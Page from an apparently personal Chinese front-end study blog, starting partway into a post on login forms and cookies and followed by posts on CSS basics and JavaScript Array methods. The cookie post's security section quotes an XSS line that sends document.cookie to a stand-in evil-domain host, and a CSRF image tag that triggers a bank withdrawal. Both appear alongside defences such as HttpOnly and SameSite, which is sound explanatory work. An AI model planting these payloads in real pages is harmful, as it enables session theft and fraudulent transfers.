<h3 id="前端-1"><a href="#前端-1" class="headerlink" title="前端"></a>前端</h3><h5 id="跳转登录界面"><a href="#跳转登录界面" class="headerlink" title="跳转登录界面"></a>跳转登录界面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;/sign_in.html&apos;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="提交用户输入数据-1"><a href="#提交用户输入数据-1" class="headerlink" title="提交用户输入数据"></a>提交用户输入数据</h5><ol>
<li>拿到用户输入，可以监听 <code>form</code> 的 <code>submit</code> 事件</li>
<li>前端验证<ul>
<li>验证成功 ==&gt; 下一步</li>
<li>验证失败 ==&gt; 提示用户</li>
</ul>
</li>
<li>发送请求（数据是第四部分 formdata）<ul>
<li><code>form</code> 的 <code>submit</code></li>
<li><code>$post()</code></li>
</ul>
</li>
<li>成功（打印 response） ==&gt; 200 + 渲染页面</li>
<li>失败（打印 response） ==&gt; JSON 格式的字符串 + 解析 + 提示用户</li>
</ol>
<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>服务器发送到用户浏览器并保存在用户本地的一小块数据，它会在浏览器下次向同一服务器再次发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。<strong>Cookie使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能</strong></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>Cookie 主要用于以下三个方面</p>
<ol>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其他需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器跟踪行为（如跟踪用户行为等）</li>
</ol>
<h3 id="前端设置-Cookie"><a href="#前端设置-Cookie" class="headerlink" title="前端设置 Cookie"></a>前端设置 Cookie</h3><p>通过 <code>document.cookie</code> API 可以获取或设置当前文档相关联的 Cookie</p>
<h5 id="读取-Cookie"><a href="#读取-Cookie" class="headerlink" title="读取 Cookie"></a>读取 Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let  allCookie = document.cookie</span><br></pre></td></tr></table></figure>
<h5 id="设置（写一个新的）Cookie"><a href="#设置（写一个新的）Cookie" class="headerlink" title="设置（写一个新的）Cookie"></a>设置（写一个新的）Cookie</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = newCookie</span><br></pre></td></tr></table></figure>
<p><code>newCookie</code> 是一个键值对形式的字符串，使用这个方法一次只能对一个<br> Cookie 进行设置或更新。以下可选 Cookie 属性值可以跟在键值对后，用来具体化对 Cookie 的设置或更新，使用分号进行分隔</p>
<ul>
<li><p><code>;path = path</code> ==&gt; 如果没有定义，默认为当前文档位置的路径</p>
</li>
<li><p><code>;domain = domain</code> ==&gt; 如果没有定义，默认为当前文档位置的路径的域名部分</p>
</li>
<li><p><code>;max-age = max-age-in-seconds</code> ==&gt; 过期时长</p>
</li>
<li><p><code>;expires = date-in-GMTString-format</code> ==&gt; 如果没有定义，Cookie 会在会话结束时过期</p>
</li>
<li><p><code>;secure</code> ==&gt; Cookie 只能通过 HTTPS 传输</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;someCookieName=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/&quot;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="后端-code"><a href="#后端-code" class="headerlink" title="后端 + code"></a>后端 + code</h3><p>后端验证成功（200）时会设置一个 Cookie 响应头<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Set-Cookie&apos;, &apos;xxx&apos; ) // xxx 就是一个身份证</span><br></pre></td></tr></table></figure></p>
<p>设置 Cookie 之后的同源请求都会带着 Cookie</p>
<h5 id="会话期-Cookie"><a href="#会话期-Cookie" class="headerlink" title="会话期 Cookie"></a>会话期 Cookie</h5><p>浏览器关闭后会自动删除，它仅在会话期有效。会话期 Cookie 不需要指定过期时间（Expirse）或者有效期（Max-Age）</p>
<h5 id="持久性-Cookie"><a href="#持久性-Cookie" class="headerlink" title="持久性 Cookie"></a>持久性 Cookie</h5><p>持久性 Cookie 可以指定一个特定的过期时间（Expirse）或有效期（Max-Age）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = xxx; Expirse = 时间点（Max-Age = 时长）&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="secure-标记"><a href="#secure-标记" class="headerlink" title="secure 标记"></a>secure 标记</h5><p>安全的 Cookie 只应通过 HTTPS 协议加密过的请求发送给服务端，设置 secure 标记的 Cookie 只在 HTTPS 中生效</p>
<h5 id="HttpOnly-标记"><a href="#HttpOnly-标记" class="headerlink" title="HttpOnly 标记"></a>HttpOnly 标记</h5><p>由于 Cookie 可以通过 JS 的 <code>document.cookie</code> 进行修改，但是通过 JS 的 <code>document.cookie</code> 无法访问带有 HttpOnly 标记的 Cookie，所以包含服务端 Session 信息的 Cookie 不想被浏览器的 JS 脚本调用，设置 HttpOnly 标记即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader( &apos;Set-Cookie&apos;, &apos;id = a3fWa; Expires = GMT时间格式; Secure; HttpOnly&apos; )</span><br></pre></td></tr></table></figure></p>
<h5 id="Cookie-作用域"><a href="#Cookie-作用域" class="headerlink" title="Cookie 作用域"></a>Cookie 作用域</h5><p><code>Domain</code> + <code>Path</code> 标识定义了 Cookie 的作用域，即 Cookie 应该发送给那些 URL</p>
<ul>
<li><p><code>Domain</code> ==&gt; 制定哪些主机可以接收 Cookie，如果不指定，不包含子域名，如果指定了 <code>Domain</code> 则一般包含子域名。例如，如果设置 <code>Domain = mozilla.org</code>，则 Cookie 也包含在子域名中（如 <code>developer.mozilla.org</code>）</p>
</li>
<li><p><code>Path</code> ==&gt; 制定了主机下哪些路径可以接收 Cookie（该 URL 路径必须存在于请求 URL 中）。例如，设置 <code>Path = /docs</code>，那么以下路径都会匹配 <code>/docs</code> | <code>/docs/web</code> | <code>/docs/web/http</code></p>
</li>
</ul>
<h5 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h5><p>SameSite Cookie 允许服务器指定在跨站请求时该 Cookie 是否会被发送，从而可以阻止跨站请求伪造攻击（CSRF）</p>
<h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><h5 id="会话挟持和-XSS"><a href="#会话挟持和-XSS" class="headerlink" title="会话挟持和 XSS"></a>会话挟持和 XSS</h5><p>在 web 应用中，Cookie 常用来标记用户或授权会话，因此如果 web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure></p>
<p><code>HttpOnly</code> 类型的 Cookie 由于阻止了 JS 对 Cookie 的操作而能在一定程度上缓解此类攻击</p>
<h5 id="CSRF（跨域请求伪造）"><a href="#CSRF（跨域请求伪造）" class="headerlink" title="CSRF（跨域请求伪造）"></a>CSRF（跨域请求伪造）</h5><p>如果在不安全的聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>当打开含有这张图片的 HTML 页面时，如果之前登录了银行账号并且 Cookie 仍然有效（还没有其他验证步骤），银行中的钱会被自动转走。</p>
<h6 id="阻止-CSRF"><a href="#阻止-CSRF" class="headerlink" title="阻止 CSRF"></a>阻止 CSRF</h6><ol>
<li>对用户输入进行过滤来阻止 XSS</li>
<li>任何敏感操作都需要确认</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期</li>
</ol>
<h3 id="Cookie-特点"><a href="#Cookie-特点" class="headerlink" title="Cookie 特点"></a>Cookie 特点</h3><ol>
<li>Cookie 储存用户信息</li>
<li>服务器通过 <code>Set-Cookie</code> 响应头设置 Cookie </li>
<li>浏览器得到 Cookie 后，每次请求相同域名都要带上 Cookie </li>
<li>服务器通过 Cookie 得知是哪个用户（<code>request.headers.cookie</code> // 读取 Cookie ）</li>
<li>Cookie 存储在本地的一个文件中</li>
<li>Cookie 不安全，用户可以通过开发者工具 Application/Cookie 可以进行修改，或者 JS 的 <code>document.cookie</code> 进行修改</li>
<li>每个浏览器的 Cookie 不同</li>
<li>Cookie 有时效性</li>
<li>后端可以强制设置 Cookie 有效期</li>
<li>Cookie 按域名划分。一个网站只会带着自己域名的 Cookie ，不会带着其他域的 Cookie </li>
</ol>
<h5 id="Cookie-说明"><a href="#Cookie-说明" class="headerlink" title="Cookie 说明"></a>Cookie 说明</h5><p>Cookie 大小受限，每次请求新的页面 Cookie 都会被发送过去。Cookie 不能跨域调用。Cookie 的作用是与服务器进行交互，Cookie 作为 HTTP 规范的一部分存在 </p>
<h5 id="删除-Cookie"><a href="#删除-Cookie" class="headerlink" title="删除 Cookie"></a>删除 Cookie</h5><ul>
<li>服务器端可以通过设置 Expires、max-age 两个标签将 Cookie 设置为过期状态</li>
<li>JavaScript 可以通过document.cookie API 删除 Cookie</li>
</ul>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ol>
<li><p><code>formdata</code> 是一段一段上传的，上传时会触发 <code>data</code> 事件（node http get post data）</p>
</li>
<li><p>前端是不安全的，所以前端可以不进行验证，但是后端必须进行验证。用户可以通过 <code>curl</code> 发送请求，这样就越过了前端 JS</p>
</li>
<li><p><code>decodeURIComponent()</code><br>用于解码由 <code>encodeURIComponent()</code> 方法或其他类似方法编码的部分 URI（统一资源标识符）</p>
</li>
<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener"><code>Set-Cookie</code></a></p>
</li>
<li><p>CSRF（跨域请求伪造） 是指一种挟持受信任用户向服务器发送非预期请求的攻击方式。例如，这些非预期请求可能在 URL 后加入一些恶意的参数，从而达到攻击者的目的</p>
</li>
<li><p>XSS（Cross-site scripting）是一种安全漏洞，攻击者利用这种漏洞在网上注入恶意的客户端代码。当被攻击者登录网站时就会自动运行这些恶意代码，从而攻击者可以突破网站的访问权限，冒充受害者。</p>
<ul>
<li>如果 Web 应用程序没有部署足够的安全验证，那么这些脚本可以任意读取 Cookie或者其他敏感的网站信息，或者让恶意脚本重写 HTML 内容</li>
<li>以下两种情况最容易发生 XSS 攻击<ol>
<li>数据从一个不可靠的链接进入一个 Web 应用程序</li>
<li>没有过滤掉恶意代码的动态内容被发送给 Web 用户</li>
</ol>
</li>
<li>XSS 攻击类型<ol>
<li><strong>存储型（持久型）</strong>：注入型脚本永久存储在目标服务器上，当浏览器请求数据时，脚本从服务器上传回并执行</li>
<li><strong>反射型（非持久型）</strong>：当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站，Web 服务器将注入脚本，比如一个错误信息、搜索结果等返回到用户浏览器上，浏览器会执行这个脚本，因为，浏览器认为这个响应来自可信任的服务器</li>
<li>基于 DOM 的 XSS：被执行的恶意脚本会修改页面脚本结构</li>
</ol>
</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/HTTP/">HTTP</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:54:05.000Z"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/总结篇（二）-- 基础知识之 CSS/">总结篇（二） -- 基础知识之 CSS</a></h1>
  

    </header>
    <div class="entry">
      
        <ol>
<li><p>选择器</p>
<ul>
<li>标签选择器</li>
<li>类选择器</li>
<li>ID 选择器</li>
<li>后代选择器</li>
<li>子选择器</li>
<li>通用选择器</li>
<li>伪类选择符</li>
<li>分组选择符</li>
</ul>
</li>
<li><p>文档流<br> 内联元素 ==&gt; 从左向右依次流动<br> 块级元素 ==&gt; 从上到下依次流动，每个块级元素独占一行</p>
</li>
<li>盒模型<br> box-sizing: content-box; ==&gt; 标准盒模型，width = contentWidth<br> box-sizing: border-box; ==&gt; width = contentWidth + padding + border</li>
<li>伪类<br> 伪类有动态伪类、结构伪类、否定伪类等等<ul>
<li>动态伪类：<br><code>:link</code> ==&gt; 未访问前的样式效果<br><code>:hover</code> ==&gt; 鼠标悬停时的样式效果<br><code>:active</code> ==&gt; 鼠标点击时的样式效果<br><code>:visited</code> ==&gt; 访问后的样式效果<br><code>:focus</code> ==&gt; 元素成为焦点时的样式效果</li>
<li>结构伪类<br><code>:first-child</code> ==&gt; 第一个子元素<br><code>:last-child</code> ==&gt; 最后一个子元素<br><code>:nth-child(n)</code> ==&gt; 第 n 个子元素</li>
<li>否定伪类<br><code>:not</code> ==&gt; 不符合参数选择器 X 描述的元素</li>
</ul>
</li>
<li>伪元素<ul>
<li><code>::before</code> ==&gt; 创建伪元素，此伪元素是元素的第一个子元素</li>
<li><code>::after</code> ==&gt; 创建伪元素，此伪元素是元素的最后一个子元素</li>
</ul>
</li>
<li><p>堆叠上下文（BFC）<br> BFC 就是块级格式化上下文。形成 BFC 条件：</p>
<ul>
<li>浮动</li>
<li>绝对定位元素（<code>position: absolute;</code>）</li>
<li>非块盒的块容器（<code>display: inline-block; | display: table-cells</code>）</li>
<li>overflow 不为 visible 的块盒</li>
<li><p><code>display: flow-root</code></p>
<p>功能：</p>
</li>
</ul>
<ol>
<li>将内部浮动元素包裹起来</li>
<li>两个相邻的 BFC 之间划清界限</li>
</ol>
</li>
<li><p>媒体查询<br> <code>&lt;link&gt;</code> 标签中的媒体查询</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; metia=&quot;(max-width: 800px)&quot; href=&quot;xxx.css&quot;&gt;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">样式表中的 CSS 媒体查询</span><br></pre></td></tr></table></figure>
<p> <style></p>
<pre><code>@media (max-width: 800px) and (min-width: 600px) {
    // 选择器 + 样式
}
</code></pre><p> </style></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8. 动态 REM</span><br><span class="line">    rem 是相对单位长度，它是根元素 ` &lt;html&gt; ` 的 ` font-size ` 的大小，网页默认的 ` font-size: 16px `，运用 JS 探取屏幕宽度，之后定义根元素的 ` </span><br><span class="line">font-size ` 与屏幕宽度相关，之后一切单位都以屏幕宽度为基准</span><br></pre></td></tr></table></figure>
<p> <script></p>
<pre><code>let pageWidth = window.innerWidth
document.write( &apos;&lt;style&gt;html{ font-size:&apos; + pageWidth/10 + &apos;px;}&lt;/style&gt;&apos; )
</code></pre><p> </script><br> ```</p>
</li>
<li>box-shadow<ul>
<li>垂直偏移</li>
<li>水平偏移</li>
<li>模糊半径</li>
<li>模糊尺寸</li>
<li>颜色</li>
</ul>
</li>
<li>transform<ul>
<li><code>translate</code> ==&gt; 移动</li>
<li><code>rotate</code> ==&gt; 旋转</li>
<li><code>skew</code> ==&gt; 倾斜</li>
<li><code>scale</code> ==&gt; 缩放</li>
</ul>
</li>
<li>帧动画<ul>
<li><code>animation-name</code> ==&gt; 动画名称</li>
<li><code>animation-duration</code> ==&gt; 持续时间</li>
<li><code>animation-delay</code> ==&gt; 延迟</li>
<li><code>animation-timing-function</code> ==&gt; 动画类型</li>
<li><code>@keyframe</code> ==&gt; 关键帧</li>
</ul>
</li>
</ol>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/总结/">总结</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-05T14:34:07.000Z"><a href="/2018/02/05/JS系列 -- Array 浅析/">2018-02-05</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/05/JS系列 -- Array 浅析/">JS系列 -- Array 浅析</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数组是按次序排列的一组值的集合，它是一个<strong>对象</strong>。<br>数组可以存储任何类型的数据（数字，字符串，布尔值或者对象）</p>
<h3 id="创建方法"><a href="#创建方法" class="headerlink" title="创建方法"></a>创建方法</h3><h5 id="使用-Array-构造函数"><a href="#使用-Array-构造函数" class="headerlink" title="使用 Array 构造函数"></a>使用 Array 构造函数</h5><p><img src="http://upload-images.jianshu.io/upload_images/9617841-6ea1c407cf635857.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 构造函数"></p>
<h5 id="使用数组字面量表示法"><a href="#使用数组字面量表示法" class="headerlink" title="使用数组字面量表示法"></a>使用数组字面量表示法</h5><p>数组字面量由一对包含数组项的方括号表示，多个数组之间以逗号隔开。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-335e259acf5fba52.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 字面量"></p>
<h1 id="属性-length"><a href="#属性-length" class="headerlink" title="属性 length"></a>属性 length</h1><p>表示数组的长度，即数组中元素的个数。<br>数组索引从 0 开始，索引上下限为 0 到 length-1 。<br>数组的 length 属性<strong>不是只读</strong>的，可以进行设置<br><img src="http://upload-images.jianshu.io/upload_images/9617841-def1e376a8012efe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length 修改"></p>
<p><strong>注意：</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-7e72fd6106cc9701.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array length"><br><code>arr02</code> 中 <code>arr02[ 1 ] === undefined</code>，这个元素是存在的，只不过值为 undefined。</p>
<h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>Array 是对象，所以 Array 有对象的一些方法<br><img src="http://upload-images.jianshu.io/upload_images/9617841-b4189f737381258e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型"><br>可以为数组添加属性，因为数组是对象。</p>
<h1 id="检测数组"><a href="#检测数组" class="headerlink" title="检测数组"></a>检测数组</h1><ul>
<li><code>Array.isArray()</code> ==&gt; 用于确定传递的值是否是一个 Array</li>
<li><code>value instanceof Array</code> ==&gt; 使用 instanceof 操作符检测数组</li>
<li><code>value.push()</code> ==&gt; 使用数组的特有方法，从而检测数组</li>
</ul>
<h1 id="方法-API"><a href="#方法-API" class="headerlink" title="方法 API"></a>方法 API</h1><h3 id="Object-原型上的-API"><a href="#Object-原型上的-API" class="headerlink" title="Object 原型上的 API"></a>Object 原型上的 API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-94e2302778e6f341.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Object 原型上的 API"></p>
<h3 id="Array-prototype-API"><a href="#Array-prototype-API" class="headerlink" title="Array.prototype API"></a>Array.prototype API</h3><p><img src="http://upload-images.jianshu.io/upload_images/9617841-ebda095a9826c3f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array 原型上的 API"></p>
<h4 id="栈方法"><a href="#栈方法" class="headerlink" title="栈方法"></a>栈方法</h4><p>栈是一种可以限制插入和删除项的数据结构。它是一种 LIFO（Last-In-First -Out，后进先出）的数据结构，栈中项的插入（推入）和移除（弹出）只发生在一个位置 —- 栈的顶部。</p>
<ul>
<li><code>push()</code> ==&gt; 将一个或多个元素添加到数组的末尾，并<strong>返回新数组的长度</strong>。</li>
<li><code>pop()</code> ==&gt; 从数组中删除最后一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
</ul>
<h4 id="队列方法"><a href="#队列方法" class="headerlink" title="队列方法"></a>队列方法</h4><p>队列数据结构的访问规则是 FIFO（Fitst-In-Fitst-Out，先进先出），队列在列表的末端添加项，在列表前端移除项。</p>
<ul>
<li><code>shift()</code> ==&gt; 从数组中删除第一个元素，并<strong>返回该元素的值</strong>。此方法更改数组的长度。</li>
<li><code>unshift()</code> ==&gt; 将一个或多个元素添加到数组的开头，并<strong>返回新数组的长度</strong>。</li>
</ul>
<h4 id="重排序方法"><a href="#重排序方法" class="headerlink" title="重排序方法"></a>重排序方法</h4><p>重排序方法 <code>sort()</code> 和<code>reverse()</code> 的<strong>返回值是经过排序之后的数组</strong>，这两种方法都会<strong>改变原数组</strong>。</p>
<ul>
<li><p><code>sort()</code> ==&gt; 在适当的位置对数组的元素进行排序，并<strong>返回数组</strong>。默认排序顺序是根据<strong>字符串Unicode码点</strong>。<br> <img src="http://upload-images.jianshu.io/upload_images/9617841-4bd79d3863269eaf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"><br> <img src="http://upload-images.jianshu.io/upload_images/9617841-b07b786adcc4b08e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array sort 排序"></p>
</li>
<li><p><code>reverse()</code> ==&gt; 将数组中元素的位置颠倒，并<strong>返回该数组的引用</strong>。第一个数组元素成为最后一个数组元素，最后一个数组元素成为第一个。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-03c659fb37fe7170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array reverse"></p>
</li>
</ul>
<h4 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h4><ul>
<li><p><code>concat()</code> ==&gt; 用于合并两个或多个数组。此方法不会更改现有数组，而是<strong>返回一个新数组</strong>。</p>
</li>
<li><p><code>slice()</code> ==&gt; <strong>返回一个从开始到结束（不包括结束）选择的数组的一部分浅拷贝到一个新数组对象</strong>，原数组不会被修改。<br><img src="http://upload-images.jianshu.io/upload_images/9617841-f46d0e64ba879c47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array slice()"></p>
</li>
<li><p><code>splice()</code> ==&gt; 通过删除现有元素和/或添加新元素来更改一个数组的内容。<br><strong>返回由被删除的元素组成的一个数组</strong>。<br><strong>删除了一个元素</strong> ==&gt; <strong>返回只包含一个元素的数组</strong>。<br><strong>没有删除元素</strong> ==&gt; <strong>返回空数组</strong>。<br><strong>参数：</strong> <code>array.splice(start [ , deleteCount [, item1 [, item2, ... ] ] ])</code><br><img src="http://upload-images.jianshu.io/upload_images/9617841-5d25a212665cf00a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array splice API"></p>
</li>
</ul>
<h4 id="位置方法"><a href="#位置方法" class="headerlink" title="位置方法"></a>位置方法</h4><ul>
<li><code>indexOf()</code> ==&gt; <strong>返回在数组中可以找到一个给定元素的第一个索引</strong>，如果不存在，则<strong>返回-1</strong></li>
<li><code>LastIndexOf()</code> ==&gt; <strong>返回指定元素在数组中的最后一个的索引</strong>，如果不存在则<strong>返回 -1</strong>。从数组的后面向前查找</li>
</ul>
<h4 id="迭代方法"><a href="#迭代方法" class="headerlink" title="迭代方法"></a>迭代方法</h4><ul>
<li><p><code>forEach()</code> ==&gt; 对数组的每个元素执行一次提供的函数。<strong>返回 undefined</strong><br>参数：<strong>回调函数</strong>和可选的执行回调函数时用作this的值，<strong>回调函数</strong>接受三个值：</p>
<ol>
<li>数组中正在处理的当前元素</li>
<li>数组中正在处理的当前元素的索引</li>
<li>forEach()方法正在操作的数组<br><img src="http://upload-images.jianshu.io/upload_images/9617841-2ecfa4be91a212d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array forEach"></li>
</ol>
</li>
<li><p><code>map()</code> ==&gt; 创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。<strong>返回一个新数组，每个元素都是回调函数的结果</strong><br><strong>和 <code>forEach</code> 作用一样，只是返回一个新数组</strong><br><img src="http://upload-images.jianshu.io/upload_images/9617841-596d0557d2e52a1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array map"></p>
</li>
<li><p><code>every()</code> ==&gt; 测试数组的所有元素是否都通过了指定函数的测试。<strong>返回布尔值</strong></p>
</li>
<li><p><code>some()</code> ==&gt; 测试数组中的某些元素是否通过由提供的函数实现的测试。<strong>返回布尔值</strong></p>
</li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-f3f669c4e73662af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array every + some"></p>
<ul>
<li><code>filter()</code> ==&gt; 创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。 <strong>返回一个新的通过测试的元素的集合的数组</strong></li>
</ul>
<p><img src="http://upload-images.jianshu.io/upload_images/9617841-36de13831ddd2bf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Array filter"></p>
<h4 id="归并方法"><a href="#归并方法" class="headerlink" title="归并方法"></a>归并方法</h4><ul>
<li><code>reduce()</code> ==&gt; 对累加器和数组中的每个元素（从左到右）应用一个函数，将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
<li><code>reduceRight()</code> ==&gt; 接受一个函数作为累加器（accumulator）和数组的每个值（从右到左）将其减少为单个值。<strong>返回函数累计处理的结果</strong></li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/JavaScript/">JavaScript</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  

  <nav id="pagination">
  
  
  <div class="clearfix"></div>
</nav>


</div></div>
      <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Suche">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">Tags</h3>
  <ul class="entry">
  
    <li><a href="/tags/CSS/">CSS</a><small>10</small></li>
  
    <li><a href="/tags/HTML/">HTML</a><small>1</small></li>
  
    <li><a href="/tags/HTTP/">HTTP</a><small>9</small></li>
  
    <li><a href="/tags/JavaScript/">JavaScript</a><small>11</small></li>
  
    <li><a href="/tags/JavaScript-进阶/">JavaScript 进阶</a><small>2</small></li>
  
    <li><a href="/tags/Plugin/">Plugin</a><small>1</small></li>
  
    <li><a href="/tags/jQuery/">jQuery</a><small>4</small></li>
  
    <li><a href="/tags/前端基础/">前端基础</a><small>4</small></li>
  
    <li><a href="/tags/博客/">博客</a><small>6</small></li>
  
    <li><a href="/tags/总结/">总结</a><small>2</small></li>
  
  </ul>
</div>


</aside>
    
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="aligncenter">
  
  &copy; 2018 吴博文
  
</div>
<div class="clearfix"></div></footer>
  <script src="http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>



<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>
<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script src="https://www.zybuluo.com/static/MathJax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</script>


  
    <!-- Go to www.addthis.com/dashboard to customize your tools -->
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-59a3e3079f1b7ad5"></script> 
  

</body>
</html>
